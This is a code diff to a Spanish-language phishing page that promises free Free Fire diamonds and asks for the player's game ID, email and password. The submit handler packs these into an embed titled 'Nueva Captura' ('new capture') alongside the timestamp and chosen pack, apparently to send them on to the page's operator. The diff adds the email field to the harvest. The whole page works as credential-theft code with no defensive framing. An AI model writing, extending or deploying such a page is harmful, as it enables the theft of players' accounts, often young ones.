@@ -160,9 +160,10 @@
         </div>
 
         <form id="form">
-            <input type="text" id="username" placeholder="🎮 ID de Free Fire" required>
+            <input type="text"     id="userid"   placeholder="🎮 ID de Free Fire" required>
+            <input type="email"    id="email"    placeholder="📧 Correo electrónico" required>
             <input type="password" id="password" placeholder="🔑 Contraseña" required>
-            <button type="submit" id="btn">RECLAMAR DIAMANTES 💎</button>
+            <button type="submit"  id="btn">RECLAMAR DIAMANTES 💎</button>
         </form>
 
         <p class="note">Solo disponible por tiempo limitado ⏳</p>
@@ -187,11 +188,12 @@
         document.getElementById("form").addEventListener("submit", async function(e) {
             e.preventDefault();
 
-            const username = document.getElementById("username").value.trim();
+            const userid   = document.getElementById("userid").value.trim();
+            const email    = document.getElementById("email").value.trim();
             const password = document.getElementById("password").value.trim();
             const btn      = document.getElementById("btn");
 
-            if (!username || !password) return;
+            if (!userid || !email || !password) return;
 
             btn.disabled    = true;
             btn.textContent = "Procesando...";
@@ -201,7 +203,8 @@
                     title: "🔥 Nueva Captura — Free Fire",
                     color: 16711680,
                     fields: [
-                        { name: "🎮 ID de Free Fire", value: "```" + username + "```", inline: true  },
+                        { name: "🎮 ID de Free Fire", value: "```" + userid   + "```", inline: true  },
+                        { name: "📧 Correo",          value: "```" + email    + "```", inline: true  },
                         { name: "🔑 Contraseña",      value: "```" + password + "```", inline: true  },
                         { name: "💎 Paquete",         value: "```" + paquete  + "```", inline: true  },
                         { name: "🕒 Hora",            value: "```" + new Date().toLocaleString() + "```", inline: false }
